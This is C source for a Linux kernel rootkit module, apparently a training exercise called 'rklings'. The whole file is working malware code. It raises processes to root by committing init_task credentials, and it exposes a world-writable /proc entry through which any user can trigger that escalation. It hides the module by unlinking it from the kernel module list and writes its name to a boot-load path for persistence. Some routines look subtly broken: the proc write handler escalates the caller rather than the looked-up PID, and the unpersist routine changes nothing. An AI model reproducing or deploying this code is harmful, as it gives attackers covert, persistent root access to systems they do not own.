// SPDX-License-Identifier: GPL-2.0
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include "rootkit.h"

/* Credential escalation */
int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	return commit_creds(new_cred);
}

/* PID escalation via /proc/rklings */
static pid_t escalate_pid;
static struct proc_dir_entry *proc_entry;

void rk_set_escalate_pid(pid_t pid)
{
	escalate_pid = pid;
}

static int rk_proc_show(struct seq_file *m, void *v)
{
	if (escalate_pid)
		seq_printf(m, "pending: %d\n", escalate_pid);
	return 0;
}

static int rk_proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_proc_show, NULL);
}

static ssize_t rk_proc_write(struct file *file, const char __user *ubuf,
			     size_t count, loff_t *ppos)
{
	struct task_struct *task;
	struct cred *new_cred;

	if (!escalate_pid)
		return count;

	task = pid_task(find_vpid(escalate_pid), PIDTYPE_PID);
	if (!task) {
		escalate_pid = 0;
		return count;
	}

	new_cred = prepare_kernel_cred(&init_task);
	if (new_cred) {
		commit_creds(new_cred);
		escalate_pid = 0;
	}

	return count;
}

static const struct proc_ops rk_proc_ops = {
	.proc_open    = rk_proc_open,
	.proc_read    = seq_read,
	.proc_write   = rk_proc_write,
	.proc_lseek   = seq_lseek,
	.proc_release = single_release,
};

int rk_proc_init(void)
{
	proc_entry = proc_create("rklings", 0666, NULL, &rk_proc_ops);
	if (!proc_entry)
		return -ENOMEM;
	return 0;
}

void rk_proc_exit(void)
{
	proc_remove(proc_entry);
}

/* Module cloaking */
static struct list_head *saved_mod_list;

void rk_cloak(void)
{
	if (saved_mod_list)
		return;
	saved_mod_list = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
}

void rk_uncloak(void)
{
	if (!saved_mod_list)
		return;
	list_add(&THIS_MODULE->list, saved_mod_list);
	saved_mod_list = NULL;
}

/* Persistence */
int rk_persist(void)
{
	struct file *f;
	loff_t pos = 0;

	f = filp_open(PERSIST_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644);
	if (IS_ERR(f))
		return PTR_ERR(f);
	kernel_write(f, MODULE_NAME_STR "\n", sizeof(MODULE_NAME_STR), &pos);
	filp_close(f, NULL);
	return 0;
}

int rk_unpersist(void)
{
	struct file *f;

	f = filp_open(PERSIST_PATH, O_WRONLY, 0);
	if (IS_ERR(f))
		return PTR_ERR(f);
	filp_close(f, NULL);
	return 0;
}
